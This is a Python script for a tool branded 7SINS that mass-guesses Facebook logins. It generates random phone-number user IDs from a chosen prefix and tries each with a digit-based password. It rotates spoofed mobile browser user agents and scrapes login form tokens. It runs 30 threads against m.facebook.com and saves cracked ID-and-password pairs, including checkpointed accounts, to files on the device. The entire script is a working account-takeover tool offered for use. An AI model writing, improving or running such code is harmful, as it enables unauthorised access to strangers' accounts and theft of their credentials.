#!/usr/bin/python3
#coding=utf-8
import os
#try:
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
ugen=[]
for jiah in range(1000):
	aa='Mozilla/5.0 (Linux; U;'
	b=random.choice(['10','11','12'])
	c='SM'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(678, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/6 U3/0.8.0 Mobile Safari/537.36'
	#g='AppleWebKt/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(90,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.2.2.590AP'
	uaku2=f'{aa} {b}; en-US; {c}{d}{e}{f}) {g}'
	ugen.append(uaku2)
def logo():
	print("""   \033[1;91m  ███████╗███████╗██╗███╗   ██╗███████╗
\033[1;91m     ╚════██║██╔════╝██║████╗  ██║██╔════╝
\033[1;93m         ██╔╝███████╗██║██╔██╗ ██║███████╗
\033[1;93m        ██╔╝ ╚════██║██║██║╚██╗██║╚════██║
\033[1;92m        ██║  ███████║██║██║ ╚████║███████║
\033[1;92m        ╚═╝  ╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
\033[0;91m╔════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;91m═══════════════════════╗
\033[0;91m║\033[1;92m➤\033[1;91m Author \033[1;97m：\033[1;93mANNOS \033[1;97m(\x1b[1;32mAZEZAL\x1b[1;37m)   \033[1;91m                  ║
\033[0;91m║\033[1;92m➤\033[1;91m Github \033[1;97m：\033[1;93mRED-DEMON-ANNOS              \033[1;91m      ║
\033[0;91m║\033[1;92m➤\033[1;91m Fb ID \033[1;97m ：\033[1;93mMR.ANNOS007              \033[1;91m          ║
\033[0;91m╚════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;91m═══════════════════════╝\033[0;97m""")
	
		
#Banni  
loop = 0
oks = []
cps = []
tls = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def main():
	os.system('clear')
	logo()
	print('\n [1] Random UID cloning')
	print("")
	opt = input(' Choose : ')
	if opt =='1':
		random_crack()
	else:
			print('\033[1;31mInvolved option!\033[1;31m')
def random_crack():
	opt = ('1')
	if opt =='1':
		random_number()
def random_number():
	user=[]
	os.system('clear')
	logo()
	print('\n \033[1;92m➤\033[0;97m Any country full number without +\n \033[1;92m➤\033[0;97m Example: 923069044939')
	user_number = input(' \033[1;92m➤\033[0;97m Put full number: ')
	limit = int(input(' \033[1;92m➤\033[0;97m Example: 1000, 2000, 5000, 10000\n\033[1;92m ➤\033[0;97m Put number limit: '))
	kode = user_number[:5]
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		logo()
		tl = str(len(user))
		print('            \x1b[1;97m\x1b[1;41m A DEMON SEEKING PEACE \x1b[0m ') 
		print("\n\033[0;91m╔════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;91m═══════════════════════╗")
		print('\033[1;92m ➤\033[0;97m Total IDs :\033[1;92m '+tl)
		print('\033[1;92m ➤\033[0;97m Process has been started\n\033[1;92m ➤\033[0;97m To Stop process press \033[1;91mCtrl + Z')
		print('\033[0;91m╚════════════════════\033[1;31m➤\033[1;92m➤\033[1;93m➤\033[0;91m═══════════════════════╝\033[0;97m')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	
def rcrack(uid,pwx,tl):
	global loop
	global cps
	global oks
	global tls
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?api_key=124024574287414&skip_api_login=1&signed_next=1&next=https://m.facebook.com/dialog/oauth?app_id=124024574287414&refsrc=deprecated&app_id=124024574287414&lwv=100&refid=9',data=log_data,headers=header_freefb).text			
			log_cookies=session.cookies.get_dict().keys()
			#print('|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[7SINS-OK] '+cid+' | '+ps)
				open('/sdcard/7SINSOK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[7SINS-CP] '+cid+' | '+ps )
				open('/sdcard/7SINSCP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;97m[ \033[1;91m#7SINS\033[1;97m ]\033[1;37m%s/%s|\33[1;97mOK/CP/TL:%s/%s/%s'%(tl,loop,len(oks),len(cps),len(tls))),
		sys.stdout.flush()
	except:
		pass
main()